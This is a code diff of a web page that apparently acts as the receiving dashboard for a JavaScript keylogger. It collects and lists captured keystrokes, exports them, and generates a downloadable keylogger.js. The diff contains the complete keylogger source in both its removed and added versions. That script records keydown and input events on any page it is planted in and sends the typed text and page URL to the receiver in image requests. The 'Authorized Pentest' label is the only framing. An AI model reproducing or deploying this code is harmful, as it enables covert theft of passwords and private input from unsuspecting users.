@@ -50,7 +50,7 @@
             flex-wrap: wrap;
             margin-bottom: 20px;
         }
-        .controls button, .controls a {
+        .controls button {
             background: #111;
             border: 1px solid #0ff;
             color: #0ff;
@@ -59,10 +59,9 @@
             font-size: 13px;
             border-radius: 3px;
             cursor: pointer;
-            text-decoration: none;
             transition: 0.2s;
         }
-        .controls button:hover, .controls a:hover {
+        .controls button:hover {
             background: #0ff;
             color: #000;
         }
@@ -74,11 +73,11 @@
             background: #f44;
             color: #000;
         }
-        .controls .download-btn {
+        .controls button.download-btn {
             border-color: #0f0;
             color: #0f0;
         }
-        .controls .download-btn:hover {
+        .controls button.download-btn:hover {
             background: #0f0;
             color: #000;
         }
@@ -176,9 +175,8 @@
         <button onclick="loadEntries()">🔄 Refresh</button>
         <button id="auto-refresh-btn" onclick="toggleAutoRefresh()">⏸ Pause</button>
         <button class="danger" onclick="clearEntries()">🗑 Clear</button>
-        <a href="#" onclick="exportLog()">📥 Export TXT</a>
-        <!-- DOWNLOAD KEYLOGGER BUTTON - FIXED -->
-        <button class="download-btn" onclick="downloadKeylogger()" style="border:1px solid #0f0;background:#111;color:#0f0;padding:8px 18px;font-family:'Courier New',monospace;font-size:13px;border-radius:3px;cursor:pointer;">⬇ Download keylogger.js</button>
+        <button onclick="exportLog()">📥 Export TXT</button>
+        <button class="download-btn" onclick="downloadKeylogger()">⬇ Download keylogger.js</button>
     </div>
 
     <div id="entries-container">
@@ -192,21 +190,13 @@
     <div id="toast" class="toast">✓ Done!</div>
 
     <script>
-        // ============================================================
-        //  STORAGE KEY
-        // ============================================================
         const STORAGE_KEY = 'keylog_entries';
 
-        // ============================================================
-        //  CAPTURE INCOMING DATA (via URL parameters)
-        // ============================================================
         function captureFromURL() {
             const params = new URLSearchParams(window.location.search);
             const keystrokes = params.get('k');
             const sourceUrl = params.get('u') || 'unknown';
-
             if (!keystrokes) return false;
-
             const entry = {
                 id: Date.now() + '_' + Math.random().toString(36).slice(2, 6),
                 timestamp: new Date().toISOString(),
@@ -216,15 +206,12 @@
                 keys: decodeURIComponent(keystrokes),
                 receivedAt: new Date().toLocaleString()
             };
-
             const entries = getEntries();
             entries.unshift(entry);
             localStorage.setItem(STORAGE_KEY, JSON.stringify(entries));
-
             if (window.history.replaceState) {
                 window.history.replaceState({}, document.title, window.location.pathname);
             }
-
             return true;
         }
 
@@ -242,27 +229,17 @@
             const container = document.getElementById('entries-container');
             const countEl = document.getElementById('entry-count');
             const totalKeysEl = document.getElementById('total-keys');
-
             countEl.textContent = entries.length;
             totalKeysEl.textContent = entries.reduce((sum, e) => sum + e.keys.length, 0);
-
             if (entries.length === 0) {
-                container.innerHTML = `
-                    <div class="empty-state">
-                        <div class="icon">📡</div>
-                        Waiting for keystrokes...<br>
-                        <small style="color:#555;">Point your keylogger to this page's URL</small>
-                    </div>
-                `;
+                container.innerHTML = '<div class="empty-state"><div class="icon">📡</div>Waiting for keystrokes...<br><small style="color:#555;">Point your keylogger to this page\'s URL</small></div>';
                 return;
             }
-
             let html = '';
             entries.forEach((entry, index) => {
                 const time = new Date(entry.timestamp).toLocaleString();
                 const keysDisplay = entry.keys
-                    .replace(/</g, '&lt;')
-                    .replace(/>/g, '&gt;')
+                    .replace(/</g, '&lt;').replace(/>/g, '&gt;')
                     .replace(/\n/g, '<span class="highlight">\\n</span><br>')
                     .replace(/\[ENTER\]/g, '<span class="highlight">[ENTER]</span><br>')
                     .replace(/\[TAB\]/g, '<span class="highlight">[TAB]</span>')
@@ -272,18 +249,8 @@
                     .replace(/\[ALT\]/g, '<span class="highlight">[ALT]</span>')
                     .replace(/\[ESC\]/g, '<span class="highlight">[ESC]</span>')
                     .replace(/\[DEL\]/g, '<span class="highlight">[DEL]</span>');
-
-                html += `
-                    <div class="entry">
-                        <div class="meta">
-                            <span>#${index + 1} — ${time}</span>
-                            <span class="url">${escapeHtml(entry.url)}</span>
-                        </div>
-                        <div class="keys">${keysDisplay}</div>
-                    </div>
-                `;
+                html += '<div class="entry"><div class="meta"><span>#' + (index + 1) + ' — ' + time + '</span><span class="url">' + escapeHtml(entry.url) + '</span></div><div class="keys">' + keysDisplay + '</div></div>';
             });
-
             container.innerHTML = html;
         }
 
@@ -299,98 +266,49 @@
             if (confirm('Delete all captured keystrokes?')) {
                 localStorage.removeItem(STORAGE_KEY);
                 renderEntries();
-                showToast('🗑 Cleared');
+                showToast('Cleared');
             }
         }
 
         function exportLog() {
             const entries = getEntries();
             if (entries.length === 0) { alert('No entries to export.'); return; }
-
-            let text = '═══════════════════════════════════════════════════════\n';
-            text += '  KEYSTROKE LOG — Authorized Pentest\n';
-            text += '  Exported: ' + new Date().toLocaleString() + '\n';
-            text += '═══════════════════════════════════════════════════════\n\n';
-
+            let text = 'Keystroke Log - Authorized Pentest\nExported: ' + new Date().toLocaleString() + '\n' + '='.repeat(60) + '\n\n';
             entries.forEach((entry, i) => {
-                text += `--- Entry #${i + 1} ---\n`;
-                text += `Time:    ${new Date(entry.timestamp).toLocaleString()}\n`;
-                text += `URL:     ${entry.url}\n`;
-                text += `UA:      ${entry.userAgent}\n`;
-                text += `Keys:    ${entry.keys}\n\n`;
+                text += '--- Entry #' + (i + 1) + ' ---\n';
+                text += 'Time:    ' + new Date(entry.timestamp).toLocaleString() + '\n';
+                text += 'URL:     ' + entry.url + '\n';
+                text += 'Keys:    ' + entry.keys + '\n\n';
             });
-
             const blob = new Blob([text], { type: 'text/plain' });
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
-            a.download = `keylog_${Date.now()}.txt`;
+            a.download = 'keylog_' + Date.now() + '.txt';
+            document.body.appendChild(a);
             a.click();
+            document.body.removeChild(a);
             URL.revokeObjectURL(url);
-            showToast('📥 Exported');
+            showToast('Exported');
         }
 
-        // ============================================================
-        //  ★ FIXED DOWNLOAD KEYLOGGER FUNCTION
-        // ============================================================
         function downloadKeylogger() {
-            // Auto-detect this page's URL (without query params)
-            const thisUrl = window.location.protocol + '//' + window.location.host + window.location.pathname;
-            const receiverUrl = thisUrl;
-
-            // Build the keylogger JavaScript source code
-            const keyloggerCode = `(function() {
-    'use strict';
-    const KEYLOGGER_URL = '${receiverUrl}';
-    let buffer = '';
-    let lastSent = Date.now();
-    const FLUSH = 3000;
-    const SPECIAL = {
-        'Enter':     '[ENTER]\\n',
-        'Tab':       '[TAB]',
-        'Backspace': '[BACKSPACE]',
-        'Shift':     '[SHIFT]',
-        'Control':   '[CTRL]',
-        'Alt':       '[ALT]',
-        'CapsLock':  '[CAPSLOCK]',
-        'Escape':    '[ESC]',
-        'ArrowUp':   '[UP]',
-        'ArrowDown': '[DOWN]',
-        'ArrowLeft': '[LEFT]',
-        'ArrowRight':'[RIGHT]',
-        'Delete':    '[DEL]',
-        'Home':      '[HOME]',
-        'End':       '[END]',
-        'PageUp':    '[PGUP]',
-        'PageDown':  '[PGDN]',
-        'Meta':      '[WIN]'
-    };
-    document.addEventListener('keydown', function(e) {
-        var k = e.key;
-        if (!k) return;
-        if (SPECIAL[k]) { buffer += SPECIAL[k]; }
-        else if (k.length === 1) { buffer += k; }
-        if (Date.now() - lastSent >= FLUSH || k === 'Enter') { flush(); lastSent = Date.now(); }
+            const receiverUrl = window.location.protocol + '//' + window.location.host + window.location.pathname;
+            const code = `(function(){
+    var U='${receiverUrl}',b='',t=Date.now(),S={Enter:'[ENTER]\\n',Tab:'[TAB]',Backspace:'[BACKSPACE]',Shift:'[SHIFT]',Control:'[CTRL]',Alt:'[ALT]',CapsLock:'[CAPSLOCK]',Escape:'[ESC]',ArrowUp:'[UP]',ArrowDown:'[DOWN]',ArrowLeft:'[LEFT]',ArrowRight:'[RIGHT]',Delete:'[DEL]',Home:'[HOME]',End:'[END]',PageUp:'[PGUP]',PageDown:'[PGDN]',Meta:'[WIN]'};
+    document.addEventListener('keydown',function(e){
+        var k=e.key;if(!k)return;
+        if(S[k])b+=S[k];else if(k.length===1)b+=k;
+        if(Date.now()-t>=3000||k==='Enter'){f();t=Date.now();}
     });
-    document.addEventListener('input', function(e) {
-        var t = e.target.tagName.toLowerCase();
-        if (t === 'input' || t === 'textarea') {
-            var v = e.target.value;
-            if (v.length > 0) buffer += v.slice(-1);
-        }
+    document.addEventListener('input',function(e){
+        var tg=e.target.tagName.toLowerCase();
+        if(tg==='input'||tg==='textarea'){var v=e.target.value;if(v.length)b+=v.slice(-1);}
     });
-    function flush() {
-        if (!buffer.length) return;
-        var d = buffer; buffer = '';
-        var img = new Image();
-        img.src = KEYLOGGER_URL + '?k=' + encodeURIComponent(d) + '&u=' + encodeURIComponent(window.location.href) + '&t=' + Date.now();
-    }
-    window.addEventListener('beforeunload', flush);
-    console.log('[keylogger] loaded, sending to:', KEYLOGGER_URL);
-})();`;
-
-            // Create a Blob with the JavaScript code
-            const blob = new Blob([keyloggerCode], { type: 'application/javascript;charset=utf-8' });
+    function f(){if(!b.length)return;var d=b;b='';new Image().src=U+'?k='+encodeURIComponent(d)+'&u='+encodeURIComponent(location.href)+'&t='+Date.now();}
+    window.addEventListener('beforeunload',f);
+})()`;
+            const blob = new Blob([code], { type: 'application/javascript' });
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
@@ -398,18 +316,10 @@
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
-
-            // Clean up the object URL after a short delay
-            setTimeout(function() {
-                URL.revokeObjectURL(url);
-            }, 100);
-
-            showToast('⬇ keylogger.js downloaded!');
+            setTimeout(function() { URL.revokeObjectURL(url); }, 100);
+            showToast('Downloaded keylogger.js');
         }
 
-        // ============================================================
-        //  TOAST
-        // ============================================================
         function showToast(msg) {
             const toast = document.getElementById('toast');
             toast.textContent = msg;
@@ -418,9 +328,6 @@
             toast._hide = setTimeout(() => { toast.style.display = 'none'; }, 2000);
         }
 
-        // ============================================================
-        //  AUTO-REFRESH
-        // ============================================================
         let autoRefreshInterval = null;
         let autoRefreshEnabled = true;
 
@@ -428,10 +335,10 @@
             autoRefreshEnabled = !autoRefreshEnabled;
             const btn = document.getElementById('auto-refresh-btn');
             if (autoRefreshEnabled) {
-                btn.textContent = '⏸ Pause';
+                btn.textContent = 'Pause';
                 startAutoRefresh();
             } else {
-                btn.textContent = '▶ Resume';
+                btn.textContent = 'Resume';
                 stopAutoRefresh();
             }
         }
@@ -448,12 +355,8 @@
             }
         }
 
-        // ============================================================
-        //  INIT
-        // ============================================================
         (function init() {
-            const captured = captureFromURL();
-            if (captured) { showToast('✓ Keystrokes captured!'); }
+            if (captureFromURL()) { showToast('Keystrokes captured!'); }
             renderEntries();
             startAutoRefresh();
             window.addEventListener('storage', function(e) {
